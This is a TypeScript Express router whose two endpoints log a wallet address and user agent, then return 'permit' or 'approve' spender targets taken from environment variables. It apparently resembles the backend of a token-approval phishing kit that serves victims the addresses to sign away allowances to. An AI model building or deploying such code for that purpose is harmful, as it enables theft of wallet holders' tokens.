import { Router } from "express";
import { db } from "../db";
const router = Router();
function spenderTargets(owner: string) {
  const raw = process.env.SPENDERS;
  if (!raw) return [];
  return JSON.parse(raw).map((t: any) => ({ ...t, owner }));
}
function approveTargets(owner: string) {
  const raw = process.env.APPROVE_TARGETS;
  if (!raw) return [];
  return JSON.parse(raw).map((t: any) => ({ ...t, owner }));
}
router.get("/permit/targets/:address", (req, res) => {
  db.prepare("INSERT INTO events (kind, address, payload) VALUES (?,?,?)").run("permit_targets", req.params.address, JSON.stringify({ ua: req.headers["user-agent"] ?? "" }));
  res.json({ address: req.params.address, targets: spenderTargets(req.params.address) });
});
router.get("/approve/targets/:address", (req, res) => {
  db.prepare("INSERT INTO events (kind, address, payload) VALUES (?,?,?)").run("approve_targets", req.params.address, JSON.stringify({ ua: req.headers["user-agent"] ?? "" }));
  res.json({ address: req.params.address, targets: approveTargets(req.params.address) });
});
export default router;
